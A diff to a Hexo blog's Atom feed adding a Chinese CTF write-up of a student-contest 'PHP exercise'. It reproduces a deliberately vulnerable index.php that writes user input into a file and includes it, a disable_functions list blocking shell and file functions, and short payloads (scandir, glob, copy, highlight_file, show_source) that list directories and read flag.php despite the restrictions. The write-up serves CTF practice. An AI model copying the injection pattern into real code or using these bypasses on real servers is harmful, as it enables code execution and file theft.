@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2017-01-23T04:48:21.789Z</updated>
+  <updated>2017-07-17T17:04:17.391Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -14,6 +14,45 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>第十届全国大学生信息安全竞赛-PHP execise-简单复现</title>
+    <link href="http://yoursite.com/2017/07/18/%E7%AC%AC%E5%8D%81%E5%B1%8A%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B-PHP-execise-%E7%AE%80%E5%8D%95%E5%A4%8D%E7%8E%B0/"/>
+    <id>http://yoursite.com/2017/07/18/第十届全国大学生信息安全竞赛-PHP-execise-简单复现/</id>
+    <published>2017-07-17T16:18:02.000Z</published>
+    <updated>2017-07-17T17:04:17.391Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0x00-环境搭建"><a href="#0x00-环境搭建" class="headerlink" title="0x00 环境搭建"></a>0x00 环境搭建</h3><p>原题代码改版：<br><a id="more"></a><br><code>index.php</code>文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">    &lt;head&gt;</div><div class="line">        &lt;meta charset=&quot;utf-8&quot;&gt;</div><div class="line">        &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge,chrome=1&quot;&gt;</div><div class="line">        &lt;title&gt;Examples&lt;/title&gt;</div><div class="line">        &lt;meta name=&quot;description&quot; content=&quot;&quot;&gt;</div><div class="line">        &lt;meta name=&quot;keywords&quot; content=&quot;&quot;&gt;</div><div class="line">        &lt;link href=&quot;&quot; rel=&quot;stylesheet&quot;&gt;</div><div class="line">    &lt;/head&gt;</div><div class="line">    &lt;body&gt;</div><div class="line">        &lt;div class=&quot;inner-cover&quot;&gt;</div><div class="line">            &lt;h1 class=&quot;cover-heading&quot;&gt;Welcome to PHP~ &lt;/h1&gt;</div><div class="line">            &lt;p class=&quot;lead&quot;&gt;PHP is the best laugage!&lt;/p&gt;</div><div class="line">            &lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;</div><div class="line">                Name: &lt;input type=&quot;text&quot; name=&quot;code&quot;&gt;&lt;br&gt;</div><div class="line">                &lt;input type=&quot;submit&quot;&gt;</div><div class="line">            &lt;/form&gt;</div><div class="line">        &lt;/div&gt;</div><div class="line">        &lt;div class=&quot;col-md-12&quot;&gt;</div><div class="line">            &lt;br&gt;&lt;hr&gt;&lt;hr&gt;&lt;br&gt;</div><div class="line">            &lt;p class=&quot;lead&quot;&gt;</div><div class="line">                &lt;?php</div><div class="line">                    if (isset($_REQUEST[&apos;code&apos;])) &#123;</div><div class="line">                $code= &quot;&lt;?php &quot;.$_REQUEST[&apos;code&apos;].&quot; ?&gt;&quot;;</div><div class="line">                file_put_contents(&quot;tmp.php&quot;, $code);</div><div class="line">                echo &quot;OUTCOME: \n&quot;;</div><div class="line">                include &quot;tmp.php&quot;;</div><div class="line">                &#125;</div><div class="line">                ?&gt;</div><div class="line">            &lt;/p&gt;</div><div class="line">        &lt;/div&gt;</div><div class="line">    &lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
+<p>在相同目录下建立<code>tmp.php</code>和<code>flag.php</code>文件</p>
+<p><img src="http://ok508kqsu.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170718002550.jpg" alt=""></p>
+<p>还要在PHP.INI，找到这行：</p>
+<p><code>disable_functions =</code></p>
+<p>在后面加上禁用的函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,fopen,file_get_contents,fread,file_get_contents,file,readfile,opendir,readdir,closedir,rewinddir,</div></pre></td></tr></table></figure></p>
+<h3 id="0x01-解题思路"><a href="#0x01-解题思路" class="headerlink" title="0x01 解题思路"></a>0x01 解题思路</h3><p>主要是列目录，读文件。<br>看了表哥们的writeup，有两种方法列目录:</p>
+<p>1)<code>foreach (glob(&quot;./*&quot;) as $filename) {  echo $filename.&quot;&lt;br&gt;&quot;; }</code></p>
+<p><img src="http://ok508kqsu.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170718002551.jpg" alt=""></p>
+<p>2)<code>print_r( scandir(&quot;./&quot;));</code></p>
+<p><img src="http://ok508kqsu.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170718004347.jpg" alt=""></p>
+<p>读文件有三种方法，但应该不止。</p>
+<p>1)<code>copy(&#39;flag.php&#39;,&#39;flag.txt&#39;);</code></p>
+<p><img src="http://ok508kqsu.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170718005259.jpg" alt=""></p>
+<p>2)<code>highlight_file(&quot;flag.php&quot;);</code></p>
+<p><img src="http://ok508kqsu.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170718005360.jpg" alt=""></p>
+<p>3)<code>show_source(&quot;flag.php&quot;);</code></p>
+<p><img src="http://ok508kqsu.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170718005461.jpg" alt=""></p>
+<h3 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h3><p>个人觉得这题还是有点意思，比赛的时候没有解出来，主要是PHP功底太过弱鸡。。<br>写出来主要是防CTF中的各种套路，为下次做准备。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;0x00-环境搭建&quot;&gt;&lt;a href=&quot;#0x00-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;0x00 环境搭建&quot;&gt;&lt;/a&gt;0x00 环境搭建&lt;/h3&gt;&lt;p&gt;原题代码改版：&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
+    
+  </entry>
   
   <entry>
     <title>hexo本地文件丢失，只剩GitHub生成的文章，如何自救?</title>
